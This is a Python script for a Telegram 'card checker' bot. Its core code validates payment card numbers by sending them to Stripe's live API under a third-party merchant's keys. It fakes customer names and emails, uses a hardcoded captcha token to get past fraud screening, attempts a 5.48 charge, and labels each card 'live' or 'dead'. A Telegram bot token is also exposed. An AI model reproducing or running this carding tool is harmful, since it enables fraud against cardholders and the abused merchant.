import requests, re, random, string, json, time, sys, threading
from datetime import datetime
from flask import Flask, jsonify
import telebot
from telebot import types

# ===== CONFIGURATION =====
P_URL = ""

# INPUT YOUR TOKEN DIRECTLY HERE (REPLACE THIS STRING WITH YOUR TOKEN)
BOT_TOKEN = "8103948431:AAEZgtxTZPA1tvuo8Lc6iA5-UZ7RFiqSzhs"  # ⬅️ Paste your Telegram bot token here

# ===== FLASK WEB SERVER (for Render keep-alive) =====
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "telegram-card-checker",
        "bot": "running" if BOT_TOKEN else "no_token",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

@app.route('/ping')
def ping():
    return "pong", 200

# ===== NEW CARD CHECKING CORE MECHANICS =====
class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        if P_URL:
            self.session.proxies = {'http': P_URL, 'https': P_URL}
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
        })
    
    def get_str(self, string: str, start: str, end: str) -> str:
        """Extract substring between start and end markers."""
        try:
            parts = string.split(start, 1)
            if len(parts) > 1:
                return parts[1].split(end, 1)[0]
        except:
            pass
        return ""
    
    def format_year(self, year: str) -> str:
        """Format year to two-digit format."""
        year_mapping = {
            "2030": "30", "2031": "31", "2032": "32", "2033": "33",
            "2021": "21", "2022": "22", "2023": "23", "2024": "24",
            "2025": "25", "2026": "26", "2027": "27", "2028": "28",
            "2029": "29"
        }
        return year_mapping.get(year, year[-2:] if year else "")
    
    def generate_random_name(self) -> tuple:
        """Generate random Brazilian name."""
        names = [
            ['marcos', 'rodrigues'], ['abreu', 'vieira'], ['murilo', 'castro'], ['diego', 'oliveira'],
            ['alberto', 'gomes'], ['dario', 'almeida'], ['micael', 'andrade'], ['rodrigo', 'barros'],
            ['marlon', 'borges'], ['silva', 'campos'], ['Abrahao', 'cardoso'], ['Abade', 'carvalho'],
            ['francisco', 'costa'], ['alan', 'dias'], ['ronaldo', 'dantas'], ['marinho', 'duarte'],
            ['Abelardo', 'santos'], ['magal', 'freitas'], ['lemos', 'fernandes'], ['thales', 'ferreira'],
            ['tiago', 'garcia'], ['Diniz', 'goalves'], ['luiz', 'lima'], ['heitor', 'lopes'],
            ['leandro', 'machado'], ['arthur', 'marques'], ['david', 'bernardo'], ['juan', 'martins'],
            ['diogo', 'medeiros'], ['caue', 'melo'], ['joaquin', 'mendes'], ['isaac', 'miranda'],
            ['carlos', 'monteiro'], ['andre', 'moraes'], ['marrone', 'neves'], ['ian', 'moreira'],
        ]
        random_name = random.choice(names)
        return random_name[0].capitalize(), random_name[1].capitalize()
    
    def generate_email(self, first_name: str, last_name: str) -> str:
        """Generate random email."""
        return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 9999)}@gmail.com"
    
    def check_card(self, cc, mm, yy, cvv):
        """Check a single card using the new mechanics"""
        try:
            # Clean card number (remove spaces)
            cc = cc.replace(' ', '')
            
            # Clean expiration
            if len(mm) == 1:
                mm = f"0{mm}"
            if len(yy) == 2:
                yy = f"20{yy}"
            
            # Format year
            formatted_year = self.format_year(yy)
            
            # Generate random user data
            first_name, last_name = self.generate_random_name()
            email = self.generate_email(first_name, last_name)
            
            headers_stripe = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
            }
            
            headers_auxilia = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
            }
            
            hcaptcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZSI6MCwiZXhwIjoxNzY1MTY4MzE3LCJjZGF0YSI6ImNNVTdjL1I5UStLbVFKV3VHV1Yxb2M4SXBCMW4xcFdCZThNUHlEdUlNSnQyaFU3V0EvWnBzSTAxbUpLZ2RqQmhESGlkU2ttbXhnSFM2bjNqOFdRbnJwekVTQWdVeithNlFXSzE0VlljTkttUy9OTkkyZjhmZjY2bnlCVHFiWXF1TGx5ZklZYmtyWUlrMXlmQVgzdUdlWEtmVVZ3bUs3L2NtQ3pCTHhURElEU0ZEQlFGUk9JWjI1QUxxY21hS1U1bDJESFRGMjA5M0JFb2ZqNUMiLCJwYXNza2V5IjoiSFpNVFlVU2VFN3FGOHp1amptVjR1RzdaVjBrMFM5WE1TcVFvRTY4RHF1ckFBVVZBKzBsTHBEVkFEdnQxZG1vMFgzSDJTV1MyTDJub0c3cUdRN0l5cmp4MW9CREJFS0doblRCNHNZbS9jVkZyOGo1aGFWc1AvYlprcGlja3RIRUNxUk51akJZWWV6dURxUlVPVFlMYzZTZ2tnaTlrOXZzYVVyU1lNekpzSTJnSWNUcHk2dnBEOHJrMml1T2pmUlhzbFR5TllmOXhxOGt5dXpRamczRzlTTnF3WE1USnYzUnpiK25HWVIvQ3BnL1ZuTnEwNTdzS0dYT3Y1dWFsQzJCSFI3K3dWVnIrVlpCVHJlbjBSRGREQkN4a1ZsM1VadElFaFZtc3g0dUprYVhuRzdqeVhuTXVjM2thRzV3ejd5WEREVG4xUzF6eG9JNE1sellGeTZJMkJVVWd1QWY4bUd2WUo4UDdxRjdNMFBhbk50cG5sM0MzenFnUDNKSHRUVlErQmJYNmU1ZXduRFRBaHpEK3NnVEhXU3RrdlRUQStyNzdVbWxTQXFPODRsdGk2TysxYUVvMWpUTFBTbFJaUFBFWUw3UTZmY2tvK3VpSmRsTVl0QUJ4eEJQeUtHRFYxK3AyU0ZSWkxVSnB5cEtjcEZXNi90SmVCd0V2UDVLSzc3N2RmZ09yVTM3NXBrVTlmQXRPMlRqSXRJZjRJcGYwWTlmT3ZGdzdJSTY3cDdsTis1MjdhSjl3SmFRRDU5Q25qdmZKbklHTVpOc2M1R2RxRzR4Z0pqOW0xM3JoamRuZnFTMHozSDUyUmFzZDJiK25NN1YvemgwdmFibEo4ZjkvemZiQ1VpUlQ1cjVDUDcxeUxXVVlMeDNvbUZVdlQ4QmEwQTNRM28yRCt1VVNadjl2Z0EzeWg0MmtmMGRhUUFoWGt4ejNLOWVCRm1XWEVac0VGak5RMU8rRW9Pck1xWGlnRmV0UkVFQStRbll2OVNiY3ZublppM2w0UWJUMGFYOGJpc2hmR1R6WmRRTHNidDNIL0VGcDNnTGgvMUdONmxXVW0vR2JtQmw2ZTEzMnNIeE82NHQwSzZCR1RVc0tUOFI5ZU5wU3h3VmkwbThuQlZPOThrTHE5S0tXVmJwa0VNM0Z1eDVaVFlyVmcyUTdjYUFleGRSOTFDczRHMU56UUVyL0NZWUtlTnZub3B6QUNVVjZmalBOeDlJODNsQ3ZLWHgzNjBBOU9LeExkQWM5V0NHUmJIK1pPeEwyTHFkV2V3UDZpUyt3ajZlcWMrWHo5L0oxOVNMNWhGMHBvVnJwMHcyai9XbW5JTkNpWk5pbkp6MWtXTUhoNWxzY2gzN2lNQ3lseC84N0RRb0FucHA2WmZrR1FWYjZEWHF6enBaVEpuckVNa3NOZlE4WlMxTmh1TnJsUFVWTW82c3ZKbW80dmpYZ3RnN2Jrc1ZjeXg2SjhUSVdiQW5ZYzFFU1lFcG5RRGgvSDBNTmhSTnlCSGNudUlBUWZXOCsrQ2JxSWVUb25EY2JhUzJrV05jZEE2QzZsSTY0VGVScGVnTUNyYzJ5d0g5by9DaXpNaU5BVmlOM0IzSGQzZ0toY2IvZUUybzY3SzE4ZzFxdlBKbzhqcC9rNEVOZ0xkZFJWSXFaYTd5MHp3SmZlQVRpZTFNWU52TzlBdW9NNHBIWXhGVlJ3cXlBSyszYlI3KzI4a0o2WEZrQkcxS0VwUmhJa1hHUWh1RzRVdkhVVWNGQTAyWUx0MTZ1a1J4VWpWcXJncGkyK0JUNWRiVkhuZ003T2o1OW5ZbUw1bzRHWVVXU0NqbzhhNXZsaDF6cjF0MDhuNFJuQ3Q0eW45eGwranZEMjQ4U1dGTFdIOUxlOVRwREZzQmU1T3ZUeUxIcTBtemhuWTViVUNiUXZoaWxjWlE5TDBFY2xlYTY2M3YyRHRBcWtLZU14T2t5NDdrbGlZZGtDZ3dYdS9BTURVNUpRdndURHpOaVhaNVRNMWdQUStCRStkSU5McWlVMkw0c3NsRGRweUVYS21vV0FnWFo1amkrVDlFeWJZb0JldnZ6bVg5NDB3ZkRLL0thYm4xWVY2VkZYRGhKMnhraHVhV2hXbGhxa1dmT2pSdFJCZUpmc21iUUdVdjBUcUR0R3RWVjlya1Rua25Tem41a0dTZHh3V1BCak1qMTBKU25WOGZITWY4ZDZMbUJZQWxHVnZrcXhMV3NRVjQ0c2xtU0tkSWpNOUY1VVorNWJFYXdpTjRBTDNNUkdXMVdSZ3lXa0ZjbVNNdkowRXd5eWd5TFk4L0JJRVJOeTVzRmxmb1lGVXl5SC9FV2JRcFlnemdXR251Q1BEMCtCUVBhbWRCVkkxMFZKSmdQZmtDUkdGWC9SR0h4VHI1aW5ud3VYRVA3MHBId1NDdEZzRW5QTEd6SE9FL2p3cE9FaWsxelB2Ui8ySGJETC82c1dUeVZMZXFRYVhMc0o4OXBDNk1JSXFid2ZhSTJ3TXRtNGcvb0ZDNnFTQnRrdndFQzU4SUVIcXhDUkZqL0dDYUNubFBsT1BtTVJwUkI1QjFhZUQ4NEZsZk5xV2lvalpQSTFxZnJWQmt5UkNlS211MVdWVTFEYmNacXQ1NDQ3TXdNV00zd2hjOGNsRkE9Iiwia3IiOiIzN2Y3N2FmYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.-V-0_gZVA7F0tmV140yPxGp0s1biNTsFG6ACn1uQyUU"
            
            # Step 1: Create payment method
            post_data1 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={formatted_year}&guid=5d319c85-6154-4dbd-bce8-7f2e6aaa139e9076ee&muid=3c91e096-1757-4928-a91b-904da3a9b8e7bbf6ca&sid=3d879f8a-122c-454a-9e7f-969c91b42fa13fc2fc&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+split-card-element&referrer=https%3A%2F%2Fapp.theauxilia.com&time_on_page=214019&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&radar_options[hcaptcha_token]={hcaptcha_token}"
            
            r1 = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers_stripe,
                data=post_data1,
                timeout=15
            )
            result1 = r1.text
            payment_id = self.get_str(result1, '"id": "', '"')
            
            if not payment_id:
                return "card_error", "Failed to get payment ID"
            
            # Step 2: Initialize payment
            payload2 = {
                "email": email,
                "clientID": "b189cf6a-7911-4f9f-a8c6-a5115105dec2",
                "ammount": 5.48,
                "paymentMethod": payment_id
            }
            
            r2 = self.session.post(
                'https://app-production-gateway-api.politeisland-fa948fee.eastus2.azurecontainerapps.io/Merchant/InitializePayment',
                headers=headers_auxilia,
                json=payload2,
                timeout=15
            )
            result2 = r2.text
            token2 = self.get_str(result2, '"token":"', '"')
            token1 = self.get_str(result2, '"token":"', '_s')
            
            if not token1 or not token2:
                return "card_error", "Failed to get payment tokens"
            
            # Step 3: Confirm setup intent
            post_data3 = f"expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={token2}"
            
            r3 = self.session.post(
                f'https://api.stripe.com/v1/setup_intents/{token1}/confirm',
                headers=headers_stripe,
                data=post_data3,
                timeout=15
            )
            result3 = r3.text
            
            # Parse response and map to status
            if "Your card's security code is incorrect." in result3:
                return "✅", "INVALID_CVC - Card is live but CVC wrong"
            elif "Your card has expired." in result3:
                return "✅", "EXPIRED_CARD - Card was valid"
            elif "generic_decline" in result3:
                return "❌", "Generic decline - Card dead"
            elif "do_not_honor" in result3:
                return "❌", "Do not honor - Card dead"
            elif "card number is incomplete." in result3:
                return "❌", "Incomplete card - Invalid format"
            elif "Your card does not support this type of purchase." in result3:
                return "❌", "Purchase not supported - Card dead"
            elif 'incorrect_number' in result3:
                return "❌", "Invalid card number - Card dead"
            elif 'Unrecognized request URL' in result3:
                return "⚠️", "API error - Try again"
            elif 'succeeded' in result3:
                return "✅", "Charged 5.48 R$ - Card live"
            else:
                return "⚠️", "Unknown response - Check manually"
                
        except requests.exceptions.Timeout:
            return "⚠️", "Timeout - Network issue"
        except requests.exceptions.ConnectionError:
            return "⚠️", "Connection error - Network issue"
        except Exception as e:
            return "⚠️", f"Error: {str(e)[:50]}"

# ===== STYLISH FORMATTING FUNCTIONS =====
def create_progress_bar(percentage, width=15):
    """Create a compact progress bar"""
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

def format_time(seconds):
    """Format seconds into compact time"""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        mins = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{mins}m {secs}s"
    else:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}m"

def get_status_info(result_code, result_message):
    """Get appropriate emoji and descriptive message for status"""
    if result_code == "✅":
        if "INVALID_CVC" in result_message:
            return "✅", "Live - Invalid CVC"
        elif "EXPIRED_CARD" in result_message:
            return "✅", "Live - Expired"
        elif "Charged" in result_message:
            return "✅", "Live - Charged"
        else:
            return "✅", "Live - " + result_message
    elif result_code == "❌":
        if "Generic decline" in result_message:
            return "❌", "Dead - Generic decline"
        elif "Do not honor" in result_message:
            return "❌", "Dead - Do not honor"
        elif "Incomplete" in result_message:
            return "❌", "Dead - Invalid format"
        elif "Purchase not supported" in result_message:
            return "❌", "Dead - Not supported"
        elif "Invalid card number" in result_message:
            return "❌", "Dead - Invalid number"
        else:
            return "❌", "Dead - " + result_message
    else:  # ⚠️
        if "Timeout" in result_message:
            return "⚠️", "Error - Timeout"
        elif "Connection error" in result_message:
            return "⚠️", "Error - Connection"
        elif "API error" in result_message:
            return "⚠️", "Error - API"
        else:
            return "⚠️", "Error - " + result_message

def mask_card(card_number):
    """Mask card number compactly"""
    if len(card_number) >= 10:
        return f"{card_number[:6]}***{card_number[-4:]}"
    return card_number

# ===== TELEGRAM BOT =====
checking_processes = {}
results_data = {}
card_checker = CardChecker()

# Initialize bot only if token is provided
if BOT_TOKEN and BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')
else:
    bot = None
    if __name__ == "__main__":
        print("⚠️  WARNING: BOT_TOKEN not set or still has placeholder value!")
        print("💡 Replace 'YOUR_TELEGRAM_BOT_TOKEN_HERE' with your actual Telegram bot token")

# [REST OF THE SCRIPT REMAINS EXACTLY THE SAME - all functions, handlers, etc.]
# The only change is line 18 where you input the token directly.

# [CONTINUED WITH ALL THE ORIGINAL FUNCTIONS...]

# ===== FLASK ROUTES FOR WEB SERVER =====
def run_flask_server():
    """Run Flask web server on specified port"""
    port = 10000  # Default port
    print(f"🌐 Starting Flask server on port {port}...")
    app.run(host='0.0.0.0', port=port, debug=False)

def run_telegram_bot():
    """Run Telegram bot with error handling"""
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("❌ Cannot start bot: No valid BOT_TOKEN provided")
        print("💡 Replace 'YOUR_TELEGRAM_BOT_TOKEN_HERE' with your actual bot token")
        return
    
    print(f"🤖 Starting Telegram bot...")
    try:
        bot_info = bot.get_me()
        print(f"✅ Bot connected: @{bot_info.username}")
        print("📱 Bot is now running and listening for commands...")
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {str(e)}")

# ===== MAIN FUNCTION =====
def main():
    """Main entry point"""
    print("=" * 60)
    print("🚀 CARD CHECKER BOT STARTING...")
    print("=" * 60)
    
    # Check token
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("⚠️  WARNING: Bot token not configured!")
        print("💡 Edit line 18 and replace 'YOUR_TELEGRAM_BOT_TOKEN_HERE' with your token")
        print("=" * 60)
        # Still start web server
        run_flask_server()
        return
    
    # Start both services
    try:
        # Start Flask server in background thread
        flask_thread = threading.Thread(target=run_flask_server, daemon=True)
        flask_thread.start()
        
        # Give Flask a moment to start
        time.sleep(2)
        
        # Start Telegram bot in main thread
        run_telegram_bot()
        
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    except Exception as e:
        print(f"❌ Main error: {str(e)}")

if __name__ == "__main__":
    main()
